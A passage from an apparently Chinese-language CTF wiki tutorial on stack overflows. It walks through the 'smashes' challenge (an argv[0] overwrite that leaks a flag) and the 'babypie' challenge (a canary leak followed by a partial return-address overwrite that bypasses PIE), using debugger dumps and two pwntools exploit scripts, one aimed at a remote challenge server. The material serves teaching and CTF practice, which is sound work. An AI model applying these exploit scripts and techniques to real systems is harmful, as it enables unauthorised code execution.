\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2() [ #1] 0x400878 \u2192 mov edi, 0x40094e \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 find 22222 Argument required ( expression to compute ). gef \u27a4 find ' 22222 ' No symbol \" 22222 \" in current context. gef \u27a4 grep ' 22222 ' [+] Searching ' 22222 ' in memory [+] In '/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ' ( 0x600000 - 0x601000 ), permission = rw- 0 x600d20 - 0x600d3f \u2192 \" 222222222 ' s the flag on server }\" [ + ] In ' [ heap ] ' ( 0x601000 - 0x622000 ), permission = rw- 0 x601010 - 0x601019 \u2192 \" 222222222 \" gef \u27a4 grep PCTF [+] Searching ' PCTF ' in memory [+] In '/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ' ( 0x400000 - 0x401000 ), permission = r-x 0 x400d20 - 0x400d3f \u2192 \" PCTF { Here ' s the flag on server }\" \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u7684 2222 \u5df2\u7ecf\u8986\u76d6\u4e86 0x600d20 \u5904\u7684 flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u7684 0x400d20 \u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86 flag \u7684\u5730\u5740\u3002 \u786e\u5b9a\u504f\u79fb \u00b6 \u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9a argv[0] \u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002 \u9996\u5148\u4e0b\u65ad\u70b9\u5728 main \u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b gef \u27a4 b * 0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef \u27a4 r Starting program : / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes Breakpoint 1 , 0x00000000004006d0 in ?? () code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x4006c0 < _IO_gets@plt + 0 > jmp QWORD PTR [ rip + 0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 < _IO_gets@plt + 6 > push 0x9 0 x4006cb < _IO_gets@plt + 11 > jmp 0x400620 \u2192 0 x4006d0 sub rsp , 0x8 0 x4006d4 mov rdi , QWORD PTR [ rip + 0x200665 ] # 0x600d40 <stdout> 0x4006db xor esi , esi 0 x4006dd call 0x400660 < setbuf@plt > \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffdb78 ' , ' l8 ' ] 8 0 x00007fffffffdb78 \u2502+ 0x00 : 0x00007ffff7a2d830 \u2192 < __libc_start_main + 240 > mov edi , eax \u2190 $rsp 0 x00007fffffffdb80 \u2502+ 0x08 : 0x0000000000000000 0 x00007fffffffdb88 \u2502+ 0x10 : 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / exam [...] \" 0 x00007fffffffdb90 \u2502+ 0x18 : 0x0000000100000000 0 x00007fffffffdb98 \u2502+ 0x20 : 0x00000000004006d0 \u2192 sub rsp , 0x8 0 x00007fffffffdba0 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffdba8 \u2502+ 0x30 : 0x48c916d3cf726fe3 0 x00007fffffffdbb0 \u2502+ 0x38 : 0x00000000004006ee \u2192 xor ebp , ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x4006d0 \u2192 sub rsp, 0x8 [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) --- Type < return > to continue , or q < return > to quit--- [ #2] 0x400717 \u2192 hlt \u53ef\u4ee5\u770b\u51fa 0x00007fffffffe00b \u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662f argv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58 \u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f 0x00007fffffffdc58\u3002 \u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801 .text: 00000000004007 E0 push rbp .text: 00000000004007 E1 mov esi , offset aHelloWhatSYour ; \"Hello!\\nWhat's your name? \" .text : 00000000004007 E6 mov edi , 1 .text: 00000000004007 EB push rbx .text: 00000000004007 EC sub rsp , 118 h .text: 00000000004007 F3 mov rax , fs : 28 h .text: 00000000004007 FC mov [ rsp + 128 h + var_20 ], rax .text: 0000000000400804 xor eax , eax .text: 0000000000400806 call ___printf_chk .text: 000000000040080 B mov rdi , rsp .text: 000000000040080 E call __IO_gets \u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528 __IO_gets \u4e4b\u524d\u7684 rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728 call \u5904\uff0c\u5982\u4e0b gef \u27a4 b * 0x000000000040080E Breakpoint 2 at 0x40080e gef \u27a4 c Continuing. Hello ! What ' s your name ? Breakpoint 2 , 0x000000000040080e in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x400804 xor eax , eax 0 x400806 call 0x4006b0 < __printf_chk@plt > 0 x40080b mov rdi , rsp \u2192 0 x40080e call 0x4006c0 < _IO_gets@plt > \u21b3 0 x4006c0 < _IO_gets@plt + 0 > jmp QWORD PTR [ rip + 0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 < _IO_gets@plt + 6 > push 0x9 0 x4006cb < _IO_gets@plt + 11 > jmp 0x400620 0 x4006d0 sub rsp , 0x8 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffda40 ' , ' l8 ' ] 8 0 x00007fffffffda40 \u2502+ 0x00 : 0x0000ff0000000000 \u2190 $rsp , $rdi 0 x00007fffffffda48 \u2502+ 0x08 : 0x0000000000000000 0 x00007fffffffda50 \u2502+ 0x10 : 0x0000000000000000 0 x00007fffffffda58 \u2502+ 0x18 : 0x0000000000000000 0 x00007fffffffda60 \u2502+ 0x20 : 0x0000000000000000 0 x00007fffffffda68 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffda70 \u2502+ 0x30 : 0x0000000000000000 0 x00007fffffffda78 \u2502+ 0x38 : 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x40080e \u2192 call 0x4006c0 <_IO_gets@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 print $rsp $1 = ( void *) 0x7fffffffda40 \u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a >>> 0x00007fffffffdc58 - 0x7fffffffda40 536 >>> hex ( 536 ) '0x218' \u5229\u7528\u7a0b\u5e8f \u00b6 \u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b from pwn import * context . log_level = 'debug' smash = ELF ( './smashes' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.jarvisoj.com' , 9877 ) else : sh = process ( './smashes' ) argv_addr = 0x00007fffffffdc58 name_addr = 0x7fffffffda40 flag_addr = 0x600D20 another_flag_addr = 0x400d20 payload = 'a' * ( argv_addr - name_addr ) + p64 ( another_flag_addr ) sh . recvuntil ( 'name? ' ) sh . sendline ( payload ) sh . recvuntil ( 'flag: ' ) sh . sendline ( 'bb' ) data = sh . recv () sh . interactive () \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86 flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230 flag \u7684\u60c5\u51b5\u3002 \u9898\u76ee \u00b6 \u6808\u4e0a\u7684 partial overwrite \u00b6 partial overwrite \u8fd9\u79cd\u6280\u5de7\u5728\u5f88\u591a\u5730\u65b9\u90fd\u9002\u7528, \u8fd9\u91cc\u5148\u4ee5\u6808\u4e0a\u7684 partial overwrite \u4e3a\u4f8b\u6765\u4ecb\u7ecd\u8fd9\u79cd\u601d\u60f3 \u6211\u4eec\u77e5\u9053, \u5728\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u4fdd\u62a4\u65f6 (PIE enabled) \u9ad8\u4f4d\u7684\u5730\u5740\u4f1a\u53d1\u751f\u968f\u673a\u5316, \u4f46\u4f4e\u4f4d\u7684\u504f\u79fb\u662f\u59cb\u7ec8\u56fa\u5b9a\u7684, \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u80fd\u66f4\u6539\u4f4e\u4f4d\u7684\u504f\u79fb, \u5c31\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41, \u7ed5\u8fc7 PIE \u4fdd\u62a4 \u4f8b\u5b50 \u00b6 \u4ee5\u5b89\u6052\u676f 2018 \u5e74 7 \u6708\u6708\u8d5b\u7684 babypie \u4e3a\u4f8b\u5206\u6790\u8fd9\u4e00\u79cd\u5229\u7528\u6280\u5de7, \u9898\u76ee\u7684 binary \u653e\u5728\u4e86 ctf-challenge \u4e2d \u786e\u5b9a\u4fdd\u62a4 \u00b6 babypie: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped [ * ] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6, \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\u548c\u6808\u6ea2\u51fa\u4fdd\u62a4 \u5206\u6790\u7a0b\u5e8f \u00b6 IDA \u4e2d\u770b\u4e00\u4e0b, \u5f88\u5bb9\u6613\u5c31\u80fd\u53d1\u73b0\u6f0f\u6d1e\u70b9, \u4e24\u5904\u8f93\u5165\u90fd\u6709\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e, \u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u8f93\u5165\u4e4b\u524d, \u7a0b\u5e8f\u5bf9\u6808\u7a7a\u95f4\u8fdb\u884c\u4e86\u6e05\u96f6, \u8fd9\u6837\u6211\u4eec\u5c31\u65e0\u6cd5\u901a\u8fc7\u6253\u5370\u6808\u4e0a\u4fe1\u606f\u6765 leak binary \u6216\u8005 libc \u7684\u57fa\u5740\u4e86 __int64 sub_960 () { char buf [ 40 ]; // [rsp+0h] [rbp-30h] unsigned __int64 v2 ; // [rsp+28h] [rbp-8h] v2 = __readfsqword ( 0x28u ); setvbuf ( stdin , 0LL , 2 , 0LL ); setvbuf ( _bss_start , 0LL , 2 , 0LL ); * ( _OWORD * ) buf = 0uLL ; * ( _OWORD * ) & buf [ 16 ] = 0uLL ; puts ( \"Input your Name:\" ); read ( 0 , buf , 0x30uLL ); // overflow printf ( \"Hello %s: \\n \" , buf , * ( _QWORD * ) buf , * ( _QWORD * ) & buf [ 8 ], * ( _QWORD * ) & buf [ 16 ], * ( _QWORD * ) & buf [ 24 ]); read ( 0 , buf , 0x60uLL ); // overflow return 0LL ; } \u540c\u65f6\u4e5f\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u7ed9\u4e86\u80fd\u76f4\u63a5 get shell \u7684\u51fd\u6570 .text: 0000000000000 A3E getshell proc near .text: 0000000000000 A3E ; __unwind { .text:0000000000000A3E push rbp .text : 0000000000000 A3F mov rbp , rsp .text: 0000000000000 A42 lea rdi , command ; \"/bin/sh\" .text : 0000000000000 A49 call _system .text: 0000000000000 A4E nop .text: 0000000000000 A4F pop rbp .text: 0000000000000 A50 retn .text: 0000000000000 A50 ; } // starts at A3E .text : 0000000000000 A50 getshell endp \u8fd9\u6837\u6211\u4eec\u53ea\u8981\u63a7\u5236 rip \u5230\u8be5\u51fd\u6570\u5373\u53ef leak canary \u00b6 \u5728\u7b2c\u4e00\u6b21 read \u4e4b\u540e\u7d27\u63a5\u7740\u5c31\u6709\u4e00\u4e2a\u8f93\u51fa, \u800c read \u5e76\u4e0d\u4f1a\u7ed9\u8f93\u5165\u7684\u672b\u5c3e\u52a0\u4e0a \\0, \u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec leak \u6808\u4e0a\u5185\u5bb9\u7684\u673a\u4f1a, \u4e3a\u4e86\u7b2c\u4e8c\u6b21\u6ea2\u51fa\u80fd\u63a7\u5236\u8fd4\u56de\u5730\u5740, \u6211\u4eec\u9009\u62e9 leak canary. \u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b2c\u4e00\u6b21 read \u9700\u8981\u7684\u957f\u5ea6\u4e3a 0x30 - 0x8 + 1 (+ 1 \u662f\u4e3a\u4e86\u8986\u76d6 canary \u7684\u6700\u4f4e\u4f4d\u4e3a\u975e 0 \u7684\u503c, printf \u4f7f\u7528 %s \u65f6, \u9047\u5230 \\0 \u7ed3\u675f, \u8986\u76d6 canary \u4f4e\u4f4d\u4e3a\u975e 0 \u503c\u65f6, canary \u5c31\u53ef\u4ee5\u88ab printf \u6253\u5370\u51fa\u6765\u4e86) Breakpoint 1 , 0x0000557c8443aa08 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x7f1898a64690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x30 RDI 0x557c8443ab15 \u25c2\u2014 insb byte ptr [ rdi ], dx / * ' Hello %s : \\ n ' * / RSI 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) R8 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R9 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R10 0x37b R11 0x246 R12 0x557c8443a830 \u25c2\u2014 xor ebp , ebp R13 0x7ffd97aa0540 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 RSP 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RIP 0x557c8443aa08 \u25c2\u2014 call 0x557c8443a7e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0 x557c8443aa08 call 0x557c8443a7e0 0 x557c8443aa0d lea rax , [ rbp - 0x30 ] 0 x557c8443aa11 mov edx , 0x60 0 x557c8443aa16 mov rsi , rax 0 x557c8443aa19 mov edi , 0 0 x557c8443aa1e call 0x557c8443a7f0 0 x557c8443aa23 mov eax , 0 0 x557c8443aa28 mov rcx , qword ptr [ rbp - 8 ] 0 x557c8443aa2c xor rcx , qword ptr fs :[ 0x28 ] 0 x557c8443aa35 je 0x557c8443aa3c 0 x557c8443aa37 call 0x557c8443a7c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rsi rsp 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) ... \u2193 05:0028\u2502 0 x7ffd97aa0438 \u25c2\u2014 0xb3012605fc402a61 06:0030\u2502 rbp 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 07:0038\u2502 0 x7ffd97aa0448 \u2014\u25b8 0x557c8443aa6a \u25c2\u2014 mov eax , 0 Breakpoint *( 0x557c8443a000 + 0xA08 ) pwndbg > canary $1 = 0 canary : 0xb3012605fc402a00 pwndbg > canary \u5728 rbp - 0x8 \u7684\u4f4d\u7f6e\u4e0a, \u53ef\u4ee5\u770b\u51fa\u6b64\u65f6 canary \u7684\u4f4e\u4f4d\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a 0x61, \u8fd9\u6837\u53ea\u8981\u63a5\u6536 'a' * (0x30 - 0x8 + 1) \u540e\u7684 7 \u4f4d, \u518d\u52a0\u4e0a\u6700\u4f4e\u4f4d\u7684 '\\0', \u6211\u4eec\u5c31\u6062\u590d\u51fa\u7a0b\u5e8f\u7684 canary \u4e86 \u8986\u76d6\u8fd4\u56de\u5730\u5740 \u00b6 \u6709\u4e86 canary \u540e, \u5c31\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e8c\u6b21\u7684\u6808\u6ea2\u51fa\u6765\u6539\u5199\u8fd4\u56de\u5730\u5740\u4e86, \u63a7\u5236\u8fd4\u56de\u5730\u5740\u5230 getshell \u51fd\u6570\u5373\u53ef, \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u6ca1\u6ea2\u51fa\u65f6\u7684\u8fd4\u56de\u5730\u5740 0 x000055dc43694a1e in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RBX 0x0 RCX 0x7f206c6696f0 ( __write_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x60 RDI 0x0 RSI 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) R8 0x7f206cb22700 \u25c2\u2014 0x7f206cb22700 R9 0x3e R10 0x73 R11 0x246 R12 0x55dc43694830 \u25c2\u2014 xor ebp , ebp R13 0x7fff9aa3b050 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 RSP 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RIP 0x55dc43694a1e \u25c2\u2014 call 0x55dc436947f0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0 x55dc43694a08 call 0x55dc436947e0 0 x55dc43694a0d lea rax , [ rbp - 0x30 ] 0 x55dc43694a11 mov edx , 0x60 0 x55dc43694a16 mov rsi , rax 0 x55dc43694a19 mov edi , 0 \u25ba 0 x55dc43694a1e call 0x55dc436947f0 0 x55dc43694a23 mov eax , 0 0 x55dc43694a28 mov rcx , qword ptr [ rbp - 8 ] 0 x55dc43694a2c xor rcx , qword ptr fs :[ 0x28 ] 0 x55dc43694a35 je 0x55dc43694a3c 0 x55dc43694a37 call 0x55dc436947c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rax rsi rsp 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) ... \u2193 05:0028\u2502 0 x7fff9aa3af48 \u25c2\u2014 0xbfe0cfbabccd2861 06:0030\u2502 rbp 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 07:0038\u2502 0 x7fff9aa3af58 \u2014\u25b8 0x55dc43694a6a \u25c2\u2014 mov eax , 0 pwndbg > x / 10 i ( 0x0A3E + 0x55dc43694000 ) 0x55dc43694a3e : push rbp 0 x55dc43694a3f: mov rbp , rsp 0 x55dc43694a42: lea rdi ,[ rip + 0xd7 ] # 0x55dc43694b20 0x55dc43694a49 : call 0x55dc436947d0 0 x55dc43694a4e: nop 0 x55dc43694a4f: pop rbp 0 x55dc43694a50: ret 0x55dc43694a51 : push rbp 0 x55dc43694a52: mov rbp , rsp 0 x55dc43694a55: sub rsp , 0x10 \u53ef\u4ee5\u53d1\u73b0, \u6b64\u65f6\u7684\u8fd4\u56de\u5730\u5740\u4e0e get shell \u51fd\u6570\u7684\u5730\u5740\u53ea\u6709\u4f4e\u4f4d\u7684 16 bit \u4e0d\u540c, \u5982\u679c\u8986\u5199\u4f4e 16 bit \u4e3a 0x?A3E, \u5c31\u6709\u4e00\u5b9a\u7684\u51e0\u7387 get shell \u6700\u7ec8\u7684\u811a\u672c\u5982\u4e0b: #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] while True : try : io = process ( \"./babypie\" , timeout = 1 ) # gdb.attach(io) io . sendafter ( \": \\n \" , 'a' * ( 0x30 - 0x8 + 1 )) io . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = ' \\0 ' + io . recvn ( 7 ) success ( canary . encode ( 'hex' )) # gdb.attach(io) io . sendafter ( \": \\n \" , 'a' * ( 0x30 - 0x8 ) + canary + 'bbbbbbbb' + ' \\x3E\\x0A ' ) io . interactive () except Exception as e : io . close () print e 